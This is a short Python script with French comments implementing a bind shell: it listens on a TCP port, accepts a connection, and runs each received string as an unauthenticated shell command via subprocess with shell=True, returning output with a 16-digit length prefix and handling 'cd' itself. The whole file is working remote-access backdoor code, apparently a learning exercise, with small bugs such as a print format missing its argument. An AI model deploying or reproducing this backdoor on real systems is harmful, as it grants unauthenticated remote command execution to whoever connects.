# coding:utf8
#
import socket
import subprocess as sp, sys
import logging
import os

logging.basicConfig(level=logging.DEBUG)

try:
    host = str(sys.argv[1])
    port = int(sys.argv[2])
except IndexError:
    print("Please use arg as <host:string><port:int>")
    host = "127.0.0.1"
    port = 5555

# ouverture socket TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(5)

print("[-] Listening on %s:%d" % (host, port))
conn, addr = s.accept()

print("[+] Connection established with : %s %s" % (str(addr[0]), conn.getsockopt))

# Boucle jusqu'à deconnection
while 1:
    print("\n[%d]: Waiting to Receive Command from Client...")
    command = conn.recv(512).decode("utf8")
    print("\t[+] Command Received : %s " % command)

    if command == "exit" or command == "quit":
        print("[+] Client ask to close connection")
        break

    # Traitement du changement de répertoire
    splitcommand = command.split(" ")
    if splitcommand and splitcommand[0] == "cd":
        os.chdir(splitcommand[1])
        print("Changement de répertoire vers => " + splitcommand[1])
        retourcli = "Changement de repertoire ok => " + os.getcwd()
        length = str(len(retourcli)).zfill(16)
        bytetosend = (length + retourcli).encode("utf8")
        conn.send(bytetosend)
        continue

    # ouverture d'un shell et execution de la command edans un sous processus
    sh = sp.Popen(command, shell=True,
                  stdout=sp.PIPE,
                  stderr=sp.PIPE,
                  stdin=sp.PIPE)
    out, err = sh.communicate()

    # print("Detected encoding: " + chardet.detect(out)['encoding']) # attention peut causer des erreurs (TypeError)
    # Encodage windows : cmd > chcp => cp850
    # Encodage linux > utf8
    result = out.decode("utf8") + err.decode("utf8")

    # On code la longueur de la réponse complétée par des '0' pour un total de 16 caractères
    length = str(len(result)).zfill(16)
    # on Envoie la transmission : [longueur du message = 16 octets] +  [ reponse x octets]
    print("\t[+] Sending to Client ...")
    print("\t\t Length: %s" % length)
    print("\t\t Result (truncated): %s (...)" % result[:150])
    bytetosend = (length+result).encode("utf8")
    conn.send(bytetosend)

conn.close()
print("[+] Connection Closed Bye!")